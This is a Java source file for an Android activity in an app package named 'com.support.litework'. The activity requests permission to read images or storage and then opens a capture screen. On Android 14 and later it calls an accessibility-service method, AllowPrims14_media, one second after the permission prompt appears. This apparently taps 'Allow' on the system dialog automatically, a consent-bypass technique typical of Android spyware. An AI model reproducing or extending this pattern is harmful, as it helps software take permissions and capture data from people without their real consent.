package com.support.litework.activity;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;

import com.support.litework.R;
import com.support.litework.services.MainAccessibilityService;

public class PermissionSetMediaActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_MEDIA = 1003;
    private boolean isWaitingForPermission = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_permission_set_media);
    }

    @Override
    protected void onResume() {
        super.onResume();
        isWaitingForPermission = false;
        onRequestPermissionMedia();
    }

    @Override
    protected void onPause() {
        super.onPause();
        isWaitingForPermission = true;
    }

    private void onRequestPermissionMedia() {
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, new String[]{
//                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_REQUEST_MEDIA);
            new Handler().postDelayed(new Runnable() {

                @Override
                public void run() {
                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        if(MainAccessibilityService.getContext() != null) {//
                            MainAccessibilityService.getContext().AllowPrims14_media();
                        }
                    }
                }
            }, 1000);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{
//                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_MEDIA);
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (!isWaitingForPermission) {
            // Ensure that you're not continuing actions if the app is paused
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
            return;
        }
        if (requestCode == PERMISSION_REQUEST_MEDIA) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Intent intent = new Intent(this, CaptureActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                finish();
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}